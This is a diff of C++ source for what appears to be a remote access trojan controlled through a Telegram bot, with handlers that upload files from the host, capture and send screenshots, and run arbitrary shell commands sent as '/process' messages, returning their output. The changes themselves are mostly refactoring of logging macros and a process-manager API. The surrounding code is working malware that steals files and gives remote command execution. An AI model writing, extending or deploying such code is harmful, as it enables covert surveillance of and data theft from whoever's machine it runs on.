@@ -38,7 +38,7 @@ void Handler::handleGetCommand() {
     }
     
     const size_t file_size = std::filesystem::file_size(file_path);
-    DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);
+    HANDLER_DEBUG_LOG("Uploading {} of size {} bytes", file_path.string(), file_size);
 
     if (file_size < 2 * 1024 * KB) {
         // small file → sync
@@ -47,13 +47,13 @@ void Handler::handleGetCommand() {
         // medium file → async via thread pool
         this->long_process_pool->enqueue([this, &file_path] {
             
-            DEBUG_LOG("Async upload {}", file_path.string());
+            HANDLER_DEBUG_LOG("Async upload {}", file_path.string());
             std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
             this->backing_bot->sendMessage(fmt::format("File: {} will be uploaded", file_path.string()));
             auto resp = this->backing_bot->sendFile(file_path);
             
             if (resp != rat::tbot::BotResponse::SUCCESS) {
-                ERROR_LOG("Failed to upload {}", file_path.string());
+                HANDLER_ERROR_LOG("Failed to upload {}", file_path.string());
             }
         });
     } else {
@@ -75,10 +75,10 @@ void Handler::handleScreenshotCommand() {
         std::lock_guard<std::mutex> lock(backing_bot_mutex);
 
         if (success && std::filesystem::exists(image_path)) {
-            DEBUG_LOG("{} taken", image_path.string());
+            HANDLER_DEBUG_LOG("{} taken", image_path.string());
 
             if (this->backing_bot->sendPhoto(image_path) != rat::tbot::BotResponse::SUCCESS) {
-                ERROR_LOG("Failed uploading {}", image_path.string());
+                HANDLER_ERROR_LOG("Failed uploading {}", image_path.string());
             }
         }
         if (!output_buffer.empty()) {
@@ -93,9 +93,10 @@ void Handler::handleScreenshotCommand() {
 void Handler::parseAndHandleProcessCommand() {
     std::string message_text = this->telegram_update->message.text;
     if (message_text.size() <= 9) return;          // Not enough length for "/process "
-    message_text.erase(0, 9);                      // Remove "/process "
-    boost::trim(message_text);
-
+    {
+        message_text.erase(0, 9);                      // Remove "/process "
+        boost::trim(message_text);
+    }
     // Find first space to separate timeout and command
     const size_t space_pos = __findFirstOccurenceOfChar(message_text, ' ');
     if (space_pos == std::string::npos) {
@@ -104,9 +105,10 @@ void Handler::parseAndHandleProcessCommand() {
     }
 
     std::string timeout_str = message_text.substr(0, space_pos);
-    message_text.erase(0, space_pos);              // Remove the timeout part
-    boost::trim(message_text);
-
+    {
+        message_text.erase(0, space_pos);              // Remove the timeout part
+        boost::trim(message_text);
+    }
     int timeout_ms = 0;
     try {
         timeout_ms = std::stoi(timeout_str);
@@ -126,28 +128,28 @@ void Handler::parseAndHandleProcessCommand() {
 
     // Create and configure ProcessManager
     auto process_manager_Sptr = std::make_shared<::rat::process::ProcessManager>();
+    {
+        process_manager_Sptr->setCommand(message_text);
+        process_manager_Sptr->setTimeout(std::chrono::milliseconds(timeout_ms));
+        process_manager_Sptr->setOutputHandlingThreadPool(this->secondary_helper_pool);
 
-    process_manager_Sptr->setCommand(message_text);
-    process_manager_Sptr->setSecondaryThreadPool(this->secondary_helper_pool.get());
-    process_manager_Sptr->setTimeout(std::chrono::milliseconds(timeout_ms));
 
-    //std::vector<std::mutex*> mutexes_ptrs = { &this->backing_bot_mutex };
-    //process_manager.setMutexes(std::move(mutexes_ptrs));
-
-    process_manager_Sptr->setProcessCreationCallback([this, process_manager_Sptr](pid_t pid){
-        std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
-        this->backing_bot->sendMessage(fmt::format("Process launched with id {}", pid));
-    });
-
+        process_manager_Sptr->setProcessCreationCallback([this, process_manager_Sptr](pid_t pid){
+            std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
+            this->backing_bot->sendMessage(fmt::format("Process launched with id {}", pid));
+        });
+    }
     p_process_pool->enqueue([this, process_manager_Sptr]() {
         process_manager_Sptr->execute();
 
         std::unique_lock<std::mutex> lock(this->backing_bot_mutex);
-        this->backing_bot->sendMessage(fmt::format(
-            "exit code:{}\nstderr:{}\nstdout:{}",
-            process_manager_Sptr->getExitCode(),
-            process_manager_Sptr->stdout_str,
-            process_manager_Sptr->stderr_str )
+        this->backing_bot->sendMessage(
+            fmt::format(
+                "exit code:{}\nstderr:{}\nstdout:{}",
+                process_manager_Sptr->getExitCode(),
+                    process_manager_Sptr->getStdout(),
+                    process_manager_Sptr->getStderr() 
+            )
         );
     });
     return;
@@ -156,8 +158,8 @@ void Handler::parseAndHandleProcessCommand() {
 }//namespace rat::handler
  //
 
-#undef DEBUG_LOG
-#undef ERROR_LOG
+#undef HANDLER_DEBUG_LOG
+#undef HANDLER_ERROR_LOG
 #ifdef DEBUG_RAT_HANDLER
     #undef DEBUG_RAT_HANDLER
 #endif
